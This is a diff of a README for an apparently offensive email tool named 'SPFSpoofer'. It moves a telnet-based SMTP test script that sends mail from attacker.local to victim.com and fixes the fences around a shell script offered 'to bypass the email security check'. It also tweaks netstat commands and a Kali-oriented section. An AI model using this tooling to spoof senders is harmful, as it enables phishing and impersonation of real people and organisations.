@@ -158,6 +158,12 @@ telnet 127.0.0.1 25
 ```
 
 ### Step 5: Send Test Email
+## 📝 Automated Testing Script
+**Run**:
+```bash
+chmod +x test_spfspoofer.sh
+./test_spfspoofer.sh
+```
 
 Execute these SMTP commands in order:
 
@@ -186,7 +192,7 @@ Testing DKIM signing and SPF validation.
 QUIT
 ```
 **OR USE THE BELOW SHELL SCRIPT HELP TO BYPASS THE EMAIL SECURITY CHECK**
-''' #!/bin/bash
+``` #!/bin/bash
 
 echo "Testing SMTP with comprehensive RFC 5322 headers on port 25..."
 
@@ -234,7 +240,7 @@ echo "QUIT"
 
 echo -e "\n\nChecking saved messages:"
 ls -lh /tmp/smtp_demo/
-'''
+```
 **Important Notes:**
 - Leave a blank line between headers and body
 - End with a single dot (`.`) on its own line
@@ -323,8 +329,8 @@ cat /tmp/smtp_demo/msg_*_signed.eml
 
 ```bash
 # Check acceptor ports
-netstat -tlnp | grep 2527
-netstat -tlnp | grep 2528
+netstat -ant | grep 25
+netstat -ant | grep 2525
 
 # Check relay port
 netstat -tlnp | grep 2526
@@ -341,7 +347,7 @@ grep -i "DKIM-Signature" /tmp/smtp_demo/msg_*_signed.eml
 
 ---
 
-## 🛠️ Advanced Configuration
+## 🛠️ Advanced Configuration (If running from Kali OS)
 
 ### Running on Standard Port 25 (Requires Root)
 
@@ -449,48 +455,6 @@ grep "DKIM-Signature" /tmp/smtp_demo/msg_*_signed.eml
 
 # Verify key file exists and has correct permissions
 ls -l /tmp/dkim_key.pem
-```
-
----
-
-## 📝 Automated Testing Script
-
-Save as `test_spfspoofer.sh`:
-
-```bash
-#!/bin/bash
-
-echo "Testing SPFSpoofer on port 2527..."
-
-(
-echo "EHLO test.local"
-sleep 0.5
-echo "MAIL FROM:<test@attacker.local>"
-sleep 0.5
-echo "RCPT TO:<recipient@victim.com>"
-sleep 0.5
-echo "DATA"
-sleep 0.5
-echo "From: test@attacker.local"
-echo "To: recipient@victim.com"
-echo "Subject: Automated Test - $(date)"
-echo "Date: $(date -R)"
-echo ""
-echo "This is an automated test message."
-echo "Timestamp: $(date)"
-echo "."
-sleep 0.5
-echo "QUIT"
-) | telnet 127.0.0.1 2527
-
-echo -e "\n\nChecking saved messages:"
-ls -lh /tmp/smtp_demo/
-```
-
-**Run**:
-```bash
-chmod +x test_spfspoofer.sh
-./test_spfspoofer.sh
 ```
 
 ---
